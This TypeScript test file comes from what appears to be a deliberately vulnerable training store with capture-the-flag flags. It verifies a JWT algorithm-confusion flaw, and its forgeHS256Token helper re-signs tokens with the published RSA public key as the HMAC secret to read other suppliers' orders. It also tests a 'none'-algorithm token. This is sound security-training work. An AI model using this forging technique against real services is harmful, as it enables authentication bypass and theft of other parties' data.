import crypto from "crypto";
import {
  apiRequest,
  authHeaders,
  loginOrFail,
  TEST_USERS,
} from "../helpers/api";
import { FLAGS } from "../helpers/flags";

interface SandboxToken {
  access_token: string;
  token_type: string;
  expires_in: number;
  scope: string;
  partner_id: string;
}

interface PartnerOrder {
  purchaseOrderId: string;
  total: number;
  notes: string | null;
  createdAt: string;
}

interface PartnerOrdersResponse {
  partnerId: string;
  count: number;
  orders: PartnerOrder[];
}

const SANDBOX_PARTNER_ID = "SUP-SANDBOX";
const TARGET_PARTNER_ID = "SUP-LETTUCE";

const encode = (value: object) =>
  Buffer.from(JSON.stringify(value)).toString("base64url");

function forgeHS256Token(supplierId: string, secret: string): string {
  const now = Math.floor(Date.now() / 1000);
  const header = encode({ alg: "HS256", typ: "JWT" });
  const payload = encode({
    iss: "https://oopssec.store",
    sub: supplierId,
    scope: "orders:read",
    iat: now,
    exp: now + 3600,
  });
  const signature = crypto
    .createHmac("sha256", secret)
    .update(`${header}.${payload}`)
    .digest("base64url");

  return `${header}.${payload}.${signature}`;
}

function bearer(token: string): Record<string, string> {
  return { Authorization: `Bearer ${token}` };
}

describe("JWT Algorithm Confusion (Partner API)", () => {
  let publicKeyPem: string;

  beforeAll(async () => {
    const { status, data } = await apiRequest<string>(
      "/.well-known/partner-signing-key.pem"
    );
    expect(status).toBe(200);
    publicKeyPem = data;
  });

  describe("Published key material", () => {
    it("GET /.well-known/jwks.json publishes an RS256 signing key", async () => {
      const { status, data } = await apiRequest<{
        keys: Array<Record<string, string>>;
      }>("/.well-known/jwks.json");

      expect(status).toBe(200);
      expect(data.keys).toHaveLength(1);
      expect(data.keys[0]).toMatchObject({
        kty: "RSA",
        alg: "RS256",
        use: "sig",
      });
      expect(typeof data.keys[0].n).toBe("string");
      expect(typeof data.keys[0].kid).toBe("string");
    });

    it("GET /.well-known/partner-signing-key.pem serves the same key as SPKI PEM", async () => {
      const { data: jwks } = await apiRequest<{
        keys: Array<crypto.JsonWebKey>;
      }>("/.well-known/jwks.json");

      const rebuilt = crypto
        .createPublicKey({ key: jwks.keys[0], format: "jwk" })
        .export({ type: "spki", format: "pem" });

      expect(publicKeyPem).toBe(rebuilt);
      expect(publicKeyPem.endsWith("-----END PUBLIC KEY-----\n")).toBe(true);
    });
  });

  describe("Legitimate sandbox access", () => {
    let sandboxToken: string;

    beforeAll(async () => {
      const { status, data } = await apiRequest<SandboxToken>(
        "/api/partner/sandbox-token",
        { method: "POST" }
      );

      expect(status).toBe(200);
      expect(data.partner_id).toBe(SANDBOX_PARTNER_ID);
      expect(data.token_type).toBe("Bearer");
      sandboxToken = data.access_token;
    });

    it("issues an RS256 token scoped to the sandbox partner", () => {
      const [header, payload] = sandboxToken.split(".");

      expect(JSON.parse(Buffer.from(header, "base64url").toString()).alg).toBe(
        "RS256"
      );
      expect(JSON.parse(Buffer.from(payload, "base64url").toString()).sub).toBe(
        SANDBOX_PARTNER_ID
      );
    });

    it("returns only the sandbox partner's own orders", async () => {
      const { status, data } = await apiRequest<PartnerOrdersResponse>(
        "/api/partner/orders",
        { headers: bearer(sandboxToken) }
      );

      expect(status).toBe(200);
      expect(data.partnerId).toBe(SANDBOX_PARTNER_ID);
      expect(data.count).toBeGreaterThan(0);
      expect(JSON.stringify(data)).not.toContain(FLAGS.JWT_ALGORITHM_CONFUSION);
    });
  });

  describe("Exploitation: forging HS256 with the published public key", () => {
    it("accepts a token re-signed as HS256 using the public key as secret", async () => {
      const forged = forgeHS256Token(SANDBOX_PARTNER_ID, publicKeyPem);

      const { status, data } = await apiRequest<PartnerOrdersResponse>(
        "/api/partner/orders",
        { headers: bearer(forged) }
      );

      expect(status).toBe(200);
      expect(data.partnerId).toBe(SANDBOX_PARTNER_ID);
    });

    it("returns another supplier's purchase orders and the flag", async () => {
      const forged = forgeHS256Token(TARGET_PARTNER_ID, publicKeyPem);

      const { status, data } = await apiRequest<PartnerOrdersResponse>(
        "/api/partner/orders",
        { headers: bearer(forged) }
      );

      expect(status).toBe(200);
      expect(data.partnerId).toBe(TARGET_PARTNER_ID);

      const leaked = data.orders.find((order) =>
        order.notes?.includes(FLAGS.JWT_ALGORITHM_CONFUSION)
      );
      expect(leaked).toBeDefined();
      expect(leaked!.purchaseOrderId).toMatch(/^PO-/);
    });

    it("reaches every supplier listed in the public partner directory", async () => {
      for (const partnerId of ["SUP-001", "SUP-BRIE", TARGET_PARTNER_ID]) {
        const { status, data } = await apiRequest<PartnerOrdersResponse>(
          "/api/partner/orders",
          { headers: bearer(forgeHS256Token(partnerId, publicKeyPem)) }
        );

        expect([partnerId, status]).toEqual([partnerId, 200]);
        expect([partnerId, data.count > 0]).toEqual([partnerId, true]);
      }
    });
  });

  describe("Rejected requests", () => {
    it("rejects a request without a bearer token", async () => {
      const { status } = await apiRequest("/api/partner/orders");
      expect(status).toBe(401);
    });

    it("rejects an HS256 token signed with a guessed secret", async () => {
      const { status } = await apiRequest("/api/partner/orders", {
        headers: bearer(forgeHS256Token(TARGET_PARTNER_ID, "secret")),
      });

      expect(status).toBe(401);
    });

    it("rejects an unsigned token", async () => {
      const now = Math.floor(Date.now() / 1000);
      const header = encode({ alg: "none", typ: "JWT" });
      const payload = encode({ sub: TARGET_PARTNER_ID, exp: now + 3600 });

      const { status } = await apiRequest("/api/partner/orders", {
        headers: bearer(`${header}.${payload}.`),
      });

      expect(status).toBe(401);
    });
  });

  describe("The flag has no shortcut", () => {
    it("is not exposed through the admin XML import console", async () => {
      const adminToken = await loginOrFail(
        TEST_USERS.admin.email,
        TEST_USERS.admin.password
      );

      const { status, data } = await apiRequest("/api/admin/suppliers", {
        headers: authHeaders(adminToken),
      });

      expect(status).toBe(200);
      expect(JSON.stringify(data)).not.toContain(FLAGS.JWT_ALGORITHM_CONFUSION);
    });

    it("is not exposed on the public partner documentation page", async () => {
      const { status, data } = await apiRequest<string>("/partners");

      expect(status).toBe(200);
      expect(data).not.toContain(FLAGS.JWT_ALGORITHM_CONFUSION);
    });
  });
});
